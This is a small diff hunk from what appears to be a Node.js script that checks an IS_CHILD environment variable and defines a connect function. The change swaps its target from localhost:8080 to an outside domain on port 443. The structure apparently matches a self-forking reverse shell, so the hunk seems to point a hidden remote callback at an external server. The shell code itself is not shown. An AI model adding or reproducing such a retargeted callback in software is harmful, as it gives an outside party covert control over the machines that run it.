@@ -13,8 +13,8 @@ if (!process.env.IS_CHILD) {
 }
 
 var HOST, PORT, TIMEOUT;
-HOST="localhost";
-PORT="8080";
+HOST="zeus.shark0der.com";
+PORT="443";
 TIMEOUT="5000";
 
 function c(HOST,PORT) {
